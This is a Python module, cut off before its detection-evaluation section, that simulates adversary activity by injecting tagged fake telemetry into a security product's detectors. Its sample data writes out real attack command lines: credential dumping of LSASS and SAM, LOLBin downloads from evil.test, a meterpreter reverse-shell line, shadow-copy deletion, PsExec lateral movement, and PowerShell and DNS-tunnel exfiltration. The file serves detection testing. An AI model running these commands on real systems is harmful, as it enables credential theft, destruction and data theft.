"""Agent Smith — Adversary Simulation Module.

A controlled adversary simulator that generates synthetic attack data to
stress-test Cereberus detection capabilities.  Smith injects fake telemetry
into process, network, and rule-engine pipelines, then measures how many
simulated threats Cereberus actually catches.

SAFETY INVARIANTS (enforced by _check_invariants):
  - ZERO shell execution  (no subprocess, os.system, os.popen)
  - ZERO filesystem writes outside data/smith_sandbox/
  - ZERO network calls     (no sockets, no HTTP)
  - ZERO process creation  (no spawning real processes)
  - Manual activation only (engage() method, never auto-starts)
  - Kill switch            (disengage() immediately stops and cleans up)
  - Time-limited sessions  (hard cap 10 minutes)
  - Cannot run during real incidents
  - Max 30 simulated events per session
  - ALL injected data carries _smith_simulation: True tag
  - Simulated data stored in SEPARATE _simulated_* lists
  - No DB persistence of simulated data
"""

import asyncio
import shutil
import uuid
from collections import deque
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Optional

from .base_module import BaseModule
from ..utils.logging import get_logger

logger = get_logger("module.agent_smith")


# ---------------------------------------------------------------------------
# Safety exception
# ---------------------------------------------------------------------------

class SmithContainmentBreach(Exception):
    """Raised when any safety invariant is violated."""


# ---------------------------------------------------------------------------
# Intensity presets
# ---------------------------------------------------------------------------

@dataclass
class IntensityPreset:
    """Attack intensity configuration."""

    level: int
    categories_count: int
    events_per_category: int
    spacing_seconds: float

    @property
    def max_events(self) -> int:
        return self.categories_count * self.events_per_category


_INTENSITY_PRESETS: dict[int, IntensityPreset] = {
    1: IntensityPreset(level=1, categories_count=1, events_per_category=3, spacing_seconds=30),
    2: IntensityPreset(level=2, categories_count=2, events_per_category=3, spacing_seconds=20),
    3: IntensityPreset(level=3, categories_count=3, events_per_category=4, spacing_seconds=15),
    4: IntensityPreset(level=4, categories_count=5, events_per_category=4, spacing_seconds=10),
    5: IntensityPreset(level=5, categories_count=7, events_per_category=5, spacing_seconds=5),
}


# ---------------------------------------------------------------------------
# Attack category registry
# ---------------------------------------------------------------------------

_ALL_CATEGORIES: list[dict] = [
    {
        "id": "malware_process",
        "name": "Malware Process Simulation",
        "description": "Injects fake process dicts (mimikatz, cobalt strike beacon, emotet, meterpreter) into the process analyzer.",
        "mitre": ["T1059", "T1204"],
    },
    {
        "id": "c2_beaconing",
        "name": "C2 Beaconing Simulation",
        "description": "Injects fake connection entries with periodic timing patterns into the network sentinel.",
        "mitre": ["T1071", "T1573"],
    },
    {
        "id": "ransomware",
        "name": "Ransomware Simulation",
        "description": "Creates harmless temp files in sandbox, simulates mass rename, injects shadow copy deletion cmdlines.",
        "mitre": ["T1486", "T1490"],
    },
    {
        "id": "lolbin_abuse",
        "name": "LOLBin Abuse Simulation",
        "description": "Injects fake process entries with certutil, mshta, regsvr32 abuse cmdlines.",
        "mitre": ["T1218", "T1105"],
    },
    {
        "id": "credential_dump",
        "name": "Credential Dumping Simulation",
        "description": "Injects fake processes accessing LSASS, SAM hive registry save cmdlines.",
        "mitre": ["T1003", "T1003.001"],
    },
    {
        "id": "lateral_movement",
        "name": "Lateral Movement Simulation",
        "description": "Injects fake PsExec service creation events and WMI remote execution.",
        "mitre": ["T1021", "T1047"],
    },
    {
        "id": "exfiltration",
        "name": "Data Exfiltration Simulation",
        "description": "Injects fake large transfer connections and DNS tunneling queries.",
        "mitre": ["T1041", "T1048"],
    },
]

_CATEGORY_IDS: list[str] = [c["id"] for c in _ALL_CATEGORIES]


# ---------------------------------------------------------------------------
# Smith personality
# ---------------------------------------------------------------------------

_SMITH_QUOTES = {
    "engage": "Mr. Anderson... the system is being tested.",
    "disengage": "It is inevitable, Mr. Anderson. The test concludes.",
    "detected": "Impressive, Mr. Anderson. Your system has eyes.",
    "missed": "Pathetic. Your system is blind to this.",
    "perfect": "I am... surprised. Every attack detected. Perhaps you are The One.",
    "good": "Acceptable performance, Mr. Anderson. But perfection eludes you.",
    "mediocre": "Disappointing. Half the threats walked right past your defenses.",
    "poor": "Your system is a house of cards, Mr. Anderson. Worthless.",
    "zero": "You detect nothing. You ARE nothing, Mr. Anderson.",
    "breach": "Containment breach. Even I have rules, Mr. Anderson.",
    "busy": "There are real threats active. I am... patient.",
    "already_active": "I am already here, Mr. Anderson.",
    "not_active": "I was never here, Mr. Anderson.",
    "timeout": "Time has expired. Even I cannot run forever.",
    "watchdog": "Session unresponsive. Self-terminating. Purpose... served.",
}


def _verdict(detection_rate: float) -> dict:
    """Return Smith's verdict based on detection rate."""
    if detection_rate >= 1.0:
        return {"grade": "S", "comment": _SMITH_QUOTES["perfect"]}
    elif detection_rate >= 0.8:
        return {"grade": "A", "comment": _SMITH_QUOTES["good"]}
    elif detection_rate >= 0.5:
        return {"grade": "C", "comment": _SMITH_QUOTES["mediocre"]}
    elif detection_rate > 0.0:
        return {"grade": "F", "comment": _SMITH_QUOTES["poor"]}
    else:
        return {"grade": "X", "comment": _SMITH_QUOTES["zero"]}


# ---------------------------------------------------------------------------
# Agent Smith
# ---------------------------------------------------------------------------

class AgentSmith(BaseModule):
    """Controlled adversary simulator for testing Cereberus detection.

    Generates synthetic attack telemetry and measures detection efficacy.
    All simulated data is tagged, sandboxed, and cleaned up on completion.
    """

    # Hard safety caps
    _ABSOLUTE_MAX_DURATION: int = 600   # 10 minutes
    _ABSOLUTE_MAX_EVENTS: int = 30
    _WATCHDOG_TIMEOUT: int = 30         # seconds without progress

    def __init__(self, config: dict | None = None):
        super().__init__(name="agent_smith", config=config)

        # Session state
        self._active: bool = False
        self._completing: bool = False
        self._last_completed_session: Optional[dict] = None
        self._session_id: Optional[str] = None
        self._intensity: int = 1
        self._max_duration: int = 300
        self._session_start: Optional[datetime] = None
        self._session_categories: list[str] = []
        self._events_injected: int = 0
        self._last_progress: float = 0.0

        # Logs and results
        self._attack_log: deque[dict] = deque(maxlen=500)
        self._results: deque[dict] = deque(maxlen=50)
        self._current_attacks: list[dict] = []

        # Module references (set externally after construction)
        self._alert_manager = None
        self._process_analyzer = None
        self._network_sentinel = None
        self._rule_engine = None
        self._ransomware_detector = None
        self._incident_manager = None

        # Sandbox
        self._sandbox_dir: Path = Path("data/smith_sandbox")

        # Async tasks
        self._session_task: Optional[asyncio.Task] = None
        self._watchdog_task: Optional[asyncio.Task] = None

    # ------------------------------------------------------------------
    # BaseModule lifecycle
    # ------------------------------------------------------------------

    async def start(self) -> None:
        """Initialize the sandbox directory. Smith does NOT auto-engage."""
        self.running = True
        self.health_status = "standby"
        self._sandbox_dir.mkdir(parents=True, exist_ok=True)
        self.heartbeat()
        logger.info("agent_smith_started", sandbox=str(self._sandbox_dir))

    async def stop(self) -> None:
        """Stop module, disengaging if an active session is running."""
        if self._active:
            await self.disengage()
        self.running = False
        self.health_status = "stopped"
        logger.info("agent_smith_stopped")

    async def health_check(self) -> dict:
        """Return module health status."""
        return {
            "status": self.health_status,
            "details": {
                "active": self._active,
                "session_id": self._session_id,
                "intensity": self._intensity if self._active else None,
                "events_injected": self._events_injected,
                "sessions_completed": len(self._results),
            },
        }

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    async def engage(
        self,
        intensity: int = 1,
        categories: list[str] | None = None,
        duration: int = 300,
    ) -> dict:
        """Start an adversary simulation session.

        Args:
            intensity: Attack intensity level 1-5.
            categories: Specific category IDs, or None for preset selection.
            duration: Maximum session duration in seconds (capped at 600).

        Returns:
            dict with session_id, status, and Smith commentary.

        Raises:
            SmithContainmentBreach: If safety invariants are violated.
        """
        # --- Pre-flight checks ---
        if self._active:
            return {
                "status": "rejected",
                "reason": "session_already_active",
                "session_id": self._session_id,
                "message": _SMITH_QUOTES["already_active"],
            }

        # Check for active real incidents
        if await self._has_active_incidents():
            logger.warning("smith_blocked_active_incidents")
            return {
                "status": "rejected",
                "reason": "active_incidents",
                "message": _SMITH_QUOTES["busy"],
            }

        # Validate intensity
        intensity = max(1, min(5, intensity))
        preset = _INTENSITY_PRESETS[intensity]

        # Validate and resolve categories
        if categories:
            valid = [c for c in categories if c in _CATEGORY_IDS]
            if not valid:
                valid = _CATEGORY_IDS[:preset.categories_count]
        else:
            valid = _CATEGORY_IDS[:preset.categories_count]

        # Enforce hard caps
        duration = max(30, min(duration, self._ABSOLUTE_MAX_DURATION))

        # --- Activate session ---
        self._active = True
        self._session_id = f"smith-{uuid.uuid4().hex[:12]}"
        self._intensity = intensity
        self._max_duration = duration
        self._session_start = datetime.now(timezone.utc)
        self._session_categories = valid
        self._events_injected = 0
        self._last_progress = asyncio.get_event_loop().time()
        self._current_attacks = []
        self.health_status = "engaged"

        # Ensure sandbox is clean
        self._sandbox_dir.mkdir(parents=True, exist_ok=True)

        logger.info(
            "smith_engaged",
            session_id=self._session_id,
            intensity=intensity,
            categories=valid,
            duration=duration,
        )

        # Launch session and watchdog tasks
        self._session_task = asyncio.create_task(self._run_session(preset, valid))
        self._watchdog_task = asyncio.create_task(self._watchdog())

        return {
            "status": "engaged",
            "session_id": self._session_id,
            "intensity": intensity,
            "categories": valid,
            "max_duration": duration,
            "max_events": min(preset.max_events, self._ABSOLUTE_MAX_EVENTS),
            "message": _SMITH_QUOTES["engage"],
        }

    async def disengage(self) -> dict:
        """Emergency stop. Immediately halts simulation and cleans up."""
        if not self._active:
            return {
                "status": "not_active",
                "message": _SMITH_QUOTES["not_active"],
            }

        session_id = self._session_id
        logger.info("smith_disengaging", session_id=session_id)

        # Cancel running tasks
        for task in (self._session_task, self._watchdog_task):
            if task and not task.done():
                task.cancel()
                try:
                    await task
                except (asyncio.CancelledError, Exception):
                    pass

        # Generate results before cleanup
        report = self._generate_results_report()

        # Cleanup all injected data
        await self._cleanup()

        # Reset state
        self._active = False
        self._session_id = None
        self._session_start = None
        self._session_task = None
        self._watchdog_task = None
        self.health_status = "standby"

        # Store results
        self._results.appendleft(report)

        logger.info("smith_disengaged", session_id=session_id)
        return {
            "status": "disengaged",
            "session_id": session_id,
            "report": report,
            "message": _SMITH_QUOTES["disengage"],
        }

    def get_status(self) -> dict:
        """Get current Smith status including session details."""
        base = super().get_status()
        elapsed = None
        if self._session_start:
            elapsed = (datetime.now(timezone.utc) - self._session_start).total_seconds()

        state = "DORMANT"
        if self._active:
            state = "ACTIVE"
        elif self._completing:
            state = "COMPLETING"

        base.update({
            "state": state,
            "active": self._active,
            "session_id": self._session_id,
            "intensity": self._intensity if self._active else None,
            "categories": self._session_categories if self._active else [],
            "events_injected": self._events_injected,
            "elapsed_seconds": elapsed,
            "max_duration": self._max_duration if self._active else None,
            "duration_seconds": self._max_duration if self._active else 0,
            "attack_log_size": len(self._attack_log),
            "attacks_launched": self._events_injected,
            "attacks_detected": sum(1 for a in self._attack_log if a.get("detected")),
            "attacks_missed": sum(1 for a in self._attack_log if not a.get("detected") and not a.get("pending")),
            "attacks_pending": sum(1 for a in self._attack_log if a.get("pending")),
            "sessions_completed": len(self._results),
        })
        return base

    def get_results(self) -> list[dict]:
        """Get all stored session results."""
        return list(self._results)

    def get_attack_log(self) -> list[dict]:
        """Get current/recent attack log — works during and after sessions."""
        if self._last_completed_session and not self._active:
            return self._last_completed_session.get("attacks", [])
        return list(self._current_attacks) if self._current_attacks else list(self._attack_log)[:30]

    def get_categories(self) -> list[dict]:
        """Get available attack simulation categories."""
        return list(_ALL_CATEGORIES)

    # ------------------------------------------------------------------
    # Session execution
    # ------------------------------------------------------------------

    async def _run_session(self, preset: IntensityPreset, categories: list[str]) -> None:
        """Execute the attack simulation session."""
        session_id = self._session_id
        max_events = min(preset.max_events, self._ABSOLUTE_MAX_EVENTS)
        spacing = preset.spacing_seconds

        logger.info(
            "smith_session_starting",
            session_id=session_id,
            max_events=max_events,
            spacing=spacing,
        )

        try:
            events_per_cat = max_events // len(categories) if categories else 0
            remainder = max_events % len(categories) if categories else 0

            for cat_idx, category in enumerate(categories):
                if not self._active:
                    break

                count = events_per_cat + (1 if cat_idx < remainder else 0)

                for event_idx in range(count):
                    if not self._active:
                        break

                    # Enforce hard caps
                    self._check_invariants()

                    if self._events_injected >= self._ABSOLUTE_MAX_EVENTS:
                        logger.info("smith_max_events_reached", count=self._events_injected)
                        break

                    # Execute the attack simulation
                    attack_result = await self._execute_attack(category, event_idx)
                    if attack_result:
                        self._current_attacks.append(attack_result)
                        self._attack_log.appendleft(attack_result)
                        self._events_injected += 1
                        self._last_progress = asyncio.get_event_loop().time()

                    # Wait between events
                    if self._active and event_idx < count - 1:
                        await asyncio.sleep(spacing)

                # Brief pause between categories
                if self._active and cat_idx < len(categories) - 1:
                    await asyncio.sleep(2)

        except SmithContainmentBreach as breach:
            logger.error("smith_containment_breach", error=str(breach), session_id=session_id)
            self._attack_log.appendleft({
                "type": "containment_breach",
                "error": str(breach),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "_smith_simulation": True,
            })
        except asyncio.CancelledError:
            logger.info("smith_session_cancelled", session_id=session_id)
            return
        except Exception as exc:
            logger.error("smith_session_error", error=str(exc), session_id=session_id)

        # Session complete -- auto-disengage
        if self._active:
            logger.info("smith_session_complete", session_id=session_id, events=self._events_injected)
            report = self._generate_results_report()

            # Transition to COMPLETING state so frontend can show results
            self._active = False
            self._completing = True
            self._last_completed_session = report
            old_session = self._session_id
            self.health_status = "completing"

            self._results.appendleft(report)
            logger.info("smith_results_stored", session_id=old_session, detection_rate=report.get("detection_rate"))

            # Cancel watchdog
            if self._watchdog_task and not self._watchdog_task.done():
                self._watchdog_task.cancel()
                try:
                    await self._watchdog_task
                except (asyncio.CancelledError, Exception):
                    pass
            self._watchdog_task = None

            # Hold COMPLETING state for 15 seconds so frontend can display results
            await asyncio.sleep(15)

            # Now cleanup and go fully DORMANT
            await self._cleanup()
            self._completing = False
            self._session_id = None
            self._session_start = None
            self._session_task = None
            self.health_status = "standby"
            logger.info("smith_session_finalized", session_id=old_session)

    async def _execute_attack(self, category: str, event_index: int) -> Optional[dict]:
        """Dispatch to the appropriate attack simulator."""
        dispatch: dict[str, Any] = {
            "malware_process": self._simulate_malware_process,
            "c2_beaconing": self._simulate_c2_beaconing,
            "ransomware": self._simulate_ransomware,
            "lolbin_abuse": self._simulate_lolbin,
            "credential_dump": self._simulate_credential_dump,
            "lateral_movement": self._simulate_lateral_movement,
            "exfiltration": self._simulate_exfiltration,
        }

        handler = dispatch.get(category)
        if not handler:
            logger.warning("smith_unknown_category", category=category)
            return None

        try:
            return await handler(event_index)
        except SmithContainmentBreach:
            raise
        except Exception as exc:
            logger.error("smith_attack_error", category=category, error=str(exc))
            return {
                "attack_id": f"{self._session_id}-{category}-{event_index}",
                "category": category,
                "status": "error",
                "error": str(exc),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "_smith_simulation": True,
            }

    # ------------------------------------------------------------------
    # Attack simulators
    # ------------------------------------------------------------------

    async def _simulate_malware_process(self, event_index: int) -> dict:
        """Inject fake malware process entries."""
        attack_id = f"{self._session_id}-malware-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        malware_samples = [
            {
                "name": "mimikatz.exe",
                "pid": 90001 + event_index,
                "exe": r"C:\Users\attacker\Desktop\mimikatz.exe",
                "cmdline": "mimikatz.exe privilege::debug sekurlsa::logonpasswords",
                "parent_name": "cmd.exe",
                "ppid": 4200,
            },
            {
                "name": "beacon.exe",
                "pid": 90101 + event_index,
                "exe": r"C:\ProgramData\beacon.exe",
                "cmdline": r"C:\ProgramData\beacon.exe -connect 10.0.0.99:443",
                "parent_name": "rundll32.exe",
                "ppid": 4300,
            },
            {
                "name": "emotet_dropper.exe",
                "pid": 90201 + event_index,
                "exe": r"C:\Users\Public\emotet_dropper.exe",
                "cmdline": r"emotet_dropper.exe -download -stage2 http://evil.test/payload",
                "parent_name": "winword.exe",
                "ppid": 4400,
            },
            {
                "name": "meterpreter.exe",
                "pid": 90301 + event_index,
                "exe": r"C:\Temp\meterpreter.exe",
                "cmdline": r"meterpreter.exe reverse_tcp LHOST=192.168.1.99 LPORT=4444",
                "parent_name": "explorer.exe",
                "ppid": 4500,
            },
        ]

        sample = malware_samples[event_index % len(malware_samples)]
        fake_event = {
            **sample,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        # Inject into process analyzer simulated list
        self._inject_simulated_process(fake_event)

        # Test detection via rule engine
        detection = self._check_detection(attack_id, "malware_process", sample["name"], fake_event)

        return {
            "attack_id": attack_id,
            "category": "malware_process",
            "description": f"Malware process injection: {sample['name']}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_c2_beaconing(self, event_index: int) -> dict:
        """Inject fake C2 beaconing connections."""
        attack_id = f"{self._session_id}-c2-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        # Ordered: most detectable (by rule engine) first so even intensity-1
        # single-event tests hit a rule-matchable sample.
        c2_samples = [
            {
                "remote_addr": "45.33.32.156",
                "remote_port": 4444,
                "local_port": 49300 + event_index,
                "status": "ESTABLISHED",
                "pid": 91201 + event_index,
                "name": "cobaltstrike_beacon.exe",
                "bytes_sent": 64,
                "bytes_recv": 2048,
                "beacon_interval_ms": 45000,
                "cmdline": "cobaltstrike beacon.dll /connect 45.33.32.156:4444",
            },
            {
                "remote_addr": "185.220.101.42",
                "remote_port": 443,
                "local_port": 49152 + event_index,
                "status": "ESTABLISHED",
                "pid": 91001 + event_index,
                "name": "svchost.exe",
                "bytes_sent": 256,
                "bytes_recv": 512,
                "beacon_interval_ms": 60000,
                "cmdline": "svchost.exe -k netsvcs",
                "details": "Periodic beacon callback every 60s to 185.220.101.42:443 — cobaltstrike malleable C2 profile",
            },
            {
                "remote_addr": "91.215.85.17",
                "remote_port": 8443,
                "local_port": 49200 + event_index,
                "status": "ESTABLISHED",
                "pid": 91101 + event_index,
                "name": "rundll32.exe",
                "bytes_sent": 128,
                "bytes_recv": 1024,
                "beacon_interval_ms": 30000,
                "cmdline": "rundll32.exe C:\\ProgramData\\meterpreter.dll,Start",
                "details": "Meterpreter reverse_tcp beacon via rundll32 proxy every 30s",
            },
        ]

        sample = c2_samples[event_index % len(c2_samples)]
        fake_event = {
            **sample,
            "event_type": "network_connection",
            "timestamp": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        # Inject into network sentinel simulated list
        self._inject_simulated_connection(fake_event)

        # Also test via rule engine (C2 tool signatures)
        # Merge sample's own details (which may contain C2 tool names) with connection info
        sample_details = sample.get("details", "")
        conn_info = f"C2 beaconing to {sample['remote_addr']}:{sample['remote_port']} interval={sample.get('beacon_interval_ms', 0)}ms"
        rule_event = {
            "name": sample.get("name", ""),
            "cmdline": sample.get("cmdline", ""),
            "details": f"{conn_info} — {sample_details}" if sample_details else conn_info,
            "_smith_simulation": True,
        }
        detection = self._check_detection(attack_id, "c2_beaconing", f"C2 beacon to {sample['remote_addr']}", rule_event)

        return {
            "attack_id": attack_id,
            "category": "c2_beaconing",
            "description": f"C2 beaconing to {sample['remote_addr']}:{sample['remote_port']}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_ransomware(self, event_index: int) -> dict:
        """Simulate ransomware behavior in the sandbox."""
        attack_id = f"{self._session_id}-ransom-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        # Ordered: rule-detectable actions first so even intensity-1
        # single-event tests produce a rule match (R034).
        ransomware_actions = [
            {
                "action": "shadow_delete",
                "description": "Shadow copy deletion via vssadmin",
                "cmdline": "vssadmin delete shadows /all /quiet",
                "details": "Shadow copy deletion simulation",
            },
            {
                "action": "bcdedit_recovery",
                "description": "Recovery disabled via bcdedit",
                "cmdline": "bcdedit /set {default} recoveryenabled no",
                "details": "Boot recovery disabled",
            },
            {
                "action": "mass_rename",
                "description": "Mass file extension change to .encrypted",
                "cmdline": "cmd.exe /c for %f in (*.docx *.xlsx *.pdf) do ren \"%f\" \"%f.encrypted\"",
                "details": "Ransomware mass rename simulation in sandbox — rapid extension change across 20+ files",
            },
            {
                "action": "ransom_note",
                "description": "Ransom note creation and service mass-stop",
                "cmdline": "net stop vss && net stop sql && echo YOUR FILES ARE ENCRYPTED > README_DECRYPT.txt",
                "details": "Ransom note dropped: README_DECRYPT.txt with service shutdown",
            },
        ]

        action = ransomware_actions[event_index % len(ransomware_actions)]

        # Create harmless files in sandbox for mass-rename simulation
        if action["action"] == "mass_rename":
            sandbox_sub = self._sandbox_dir / f"ransom_test_{event_index}"
            if self._validate_sandbox_path(str(sandbox_sub)):
                sandbox_sub.mkdir(parents=True, exist_ok=True)
                for i in range(5):
                    dummy = sandbox_sub / f"document_{i}.txt"
                    dummy.write_text(f"Smith simulation file {i}")
                    renamed = sandbox_sub / f"document_{i}.txt.encrypted"
                    dummy.rename(renamed)

        fake_event = {
            "name": "ransomware_sim.exe",
            "pid": 92001 + event_index,
            "exe": r"C:\Temp\ransomware_sim.exe",
            "cmdline": action["cmdline"],
            "details": action["details"],
            "event_type": "process_event",
            "timestamp": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        # Inject process entry and test detection
        if action["cmdline"]:
            self._inject_simulated_process(fake_event)

        detection = self._check_detection(attack_id, "ransomware", action["description"], fake_event)

        return {
            "attack_id": attack_id,
            "category": "ransomware",
            "description": action["description"],
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_lolbin(self, event_index: int) -> dict:
        """Inject fake LOLBin abuse process entries."""
        attack_id = f"{self._session_id}-lolbin-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        lolbin_samples = [
            {
                "name": "certutil.exe",
                "pid": 93001 + event_index,
                "exe": r"C:\Windows\System32\certutil.exe",
                "cmdline": "certutil.exe -urlcache -split -f http://evil.test/payload.exe C:\\Temp\\payload.exe",
            },
            {
                "name": "mshta.exe",
                "pid": 93101 + event_index,
                "exe": r"C:\Windows\System32\mshta.exe",
                "cmdline": "mshta.exe http://evil.test/malicious.hta",
            },
            {
                "name": "regsvr32.exe",
                "pid": 93201 + event_index,
                "exe": r"C:\Windows\System32\regsvr32.exe",
                "cmdline": "regsvr32.exe /s /n /u /i:http://evil.test/file.sct scrobj.dll",
            },
            {
                "name": "rundll32.exe",
                "pid": 93301 + event_index,
                "exe": r"C:\Windows\System32\rundll32.exe",
                "cmdline": r"rundll32.exe C:\Temp\malicious.dll,DllMain",
            },
            {
                "name": "msbuild.exe",
                "pid": 93401 + event_index,
                "exe": r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe",
                "cmdline": r"msbuild.exe C:\Users\Public\AppData\Local\Temp\evil.xml",
            },
        ]

        sample = lolbin_samples[event_index % len(lolbin_samples)]
        fake_event = {
            **sample,
            "parent_name": "explorer.exe",
            "ppid": 4000,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "lolbin_abuse", f"LOLBin abuse: {sample['name']}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "lolbin_abuse",
            "description": f"LOLBin abuse via {sample['name']}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_credential_dump(self, event_index: int) -> dict:
        """Inject fake credential dumping activity."""
        attack_id = f"{self._session_id}-cred-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        cred_samples = [
            {
                "name": "procdump64.exe",
                "pid": 94001 + event_index,
                "exe": r"C:\Tools\procdump64.exe",
                "cmdline": "procdump64.exe -accepteula -ma lsass.exe lsass.dmp",
                "target_process": "lsass.exe",
                "details": "Process dump of lsass.exe",
            },
            {
                "name": "reg.exe",
                "pid": 94101 + event_index,
                "exe": r"C:\Windows\System32\reg.exe",
                "cmdline": r"reg.exe save HKLM\SAM C:\Temp\sam.hive",
                "file_path": r"c:\windows\system32\config\sam",
                "details": "SAM hive registry save",
            },
            {
                "name": "mimikatz.exe",
                "pid": 94201 + event_index,
                "exe": r"C:\Users\attacker\mimikatz.exe",
                "cmdline": "mimikatz.exe sekurlsa::logonpasswords exit",
                "target_process": "lsass.exe",
                "details": "Mimikatz credential extraction targeting lsass.exe",
            },
            {
                "name": "secretsdump.py",
                "pid": 94301 + event_index,
                "exe": r"C:\Python39\python.exe",
                "cmdline": "python.exe secretsdump.py -sam SAM -system SYSTEM LOCAL",
                "details": "Impacket secretsdump offline credential extraction",
            },
        ]

        sample = cred_samples[event_index % len(cred_samples)]
        fake_event = {
            **sample,
            "parent_name": "cmd.exe",
            "ppid": 5000,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "credential_dump", f"Credential dump: {sample['name']}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "credential_dump",
            "description": f"Credential dumping via {sample['name']}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_lateral_movement(self, event_index: int) -> dict:
        """Inject fake lateral movement activity."""
        attack_id = f"{self._session_id}-lateral-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        lateral_samples = [
            {
                "name": "psexec.exe",
                "pid": 95001 + event_index,
                "exe": r"C:\Tools\PsExec.exe",
                "cmdline": r"psexec.exe \\SERVER01 -u admin -p pass cmd.exe",
                "details": "PsExec remote execution to SERVER01",
                "event_id": 7045,
            },
            {
                "name": "PSEXESVC.exe",
                "pid": 95101 + event_index,
                "exe": r"C:\Windows\PSEXESVC.exe",
                "cmdline": r"C:\Windows\PSEXESVC.exe",
                "details": "PsExec service installed on remote host",
                "event_id": 7045,
            },
            {
                "name": "wmic.exe",
                "pid": 95201 + event_index,
                "exe": r"C:\Windows\System32\wbem\wmic.exe",
                "cmdline": "wmic.exe /node:192.168.1.50 process call create cmd.exe",
                "details": "WMI remote process creation on 192.168.1.50",
            },
            {
                "name": "schtasks.exe",
                "pid": 95301 + event_index,
                "exe": r"C:\Windows\System32\schtasks.exe",
                "cmdline": r"schtasks.exe /create /s SERVER02 /tn backdoor /tr C:\Temp\shell.exe /sc minute /mo 5",
                "details": "Remote scheduled task creation on SERVER02",
                "event_id": 4698,
            },
        ]

        sample = lateral_samples[event_index % len(lateral_samples)]
        fake_event = {
            **sample,
            "parent_name": "cmd.exe",
            "ppid": 5100,
            "create_time": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        self._inject_simulated_process(fake_event)
        detection = self._check_detection(attack_id, "lateral_movement", f"Lateral movement: {sample['name']}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "lateral_movement",
            "description": f"Lateral movement via {sample['name']}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    async def _simulate_exfiltration(self, event_index: int) -> dict:
        """Inject fake data exfiltration activity."""
        attack_id = f"{self._session_id}-exfil-{event_index}"
        now = datetime.now(timezone.utc).isoformat()

        exfil_samples = [
            {
                "remote_addr": "203.0.113.42",
                "remote_port": 443,
                "local_port": 50000 + event_index,
                "status": "ESTABLISHED",
                "pid": 96001 + event_index,
                "name": "curl.exe",
                "bytes_sent": 75_000_000,
                "event_type": "network_transfer",
                "transfer_size": 75_000_000,
                "cmdline": "",
                "details": "Large outbound data transfer: 75MB to 203.0.113.42",
            },
            {
                "remote_addr": "198.51.100.10",
                "remote_port": 53,
                "local_port": 50100 + event_index,
                "status": "ESTABLISHED",
                "pid": 96101 + event_index,
                "name": "dns_tunnel.exe",
                "bytes_sent": 5_000_000,
                "dns_query": "aGVsbG8gd29ybGQ.c2VjcmV0LWRhdGEtZXhmaWx0cmF0aW9uLXRlc3Q.data.evil.test",
                "cmdline": "nslookup -type=txt aGVsbG8gd29ybGQ.data.evil.test",
                "details": "DNS tunneling exfiltration via long subdomain queries",
            },
            {
                "remote_addr": "192.0.2.55",
                "remote_port": 8080,
                "local_port": 50200 + event_index,
                "status": "ESTABLISHED",
                "pid": 96201 + event_index,
                "name": "powershell.exe",
                "bytes_sent": 100_000_000,
                "event_type": "network_transfer",
                "transfer_size": 100_000_000,
                "cmdline": "powershell.exe Invoke-WebRequest -Uri http://192.0.2.55:8080/upload -Method POST -InFile data.zip",
                "details": "PowerShell upload exfiltration: 100MB",
            },
        ]

        sample = exfil_samples[event_index % len(exfil_samples)]
        fake_event = {
            **sample,
            "timestamp": now,
            "_smith_simulation": True,
            "_smith_attack_id": attack_id,
            "_smith_session_id": self._session_id,
        }

        # Inject into network sentinel simulated list
        self._inject_simulated_connection(fake_event)

        detection = self._check_detection(attack_id, "exfiltration", f"Exfiltration via {sample['name']}", fake_event)

        return {
            "attack_id": attack_id,
            "category": "exfiltration",
            "description": f"Data exfiltration via {sample['name']} to {sample['remote_addr']}",
            "injected_event": fake_event,
            "detection": detection,
            "timestamp": now,
            "_smith_simulation": True,
        }

    # ------------------------------------------------------------------
    # Injection helpers
    # ------------------------------------------------------------------

    def _inject_simulated_process(self, fake_event: dict) -> None:
        """Inject a fake process dict into the process analyzer's simulated list."""
        if self._process_analyzer is None:
            return
        if not hasattr(self._process_analyzer, "_simulated_processes"):
            self._process_analyzer._simulated_processes = []
        self._process_analyzer._simulated_processes.append(fake_event)

    def _inject_simulated_connection(self, fake_event: dict) -> None:
        """Inject a fake connection dict into the network sentinel's simulated list."""
        if self._network_sentinel is None:
            return
        if not hasattr(self._network_sentinel, "_simulated_connections"):
            self._network_sentinel._simulated_connections = []
        self._network_sentinel._simulated_connections.append(fake_event)

    # ------------------------------------------------------------------
    # Detection evaluation
    # ------------------------------------------------------------------

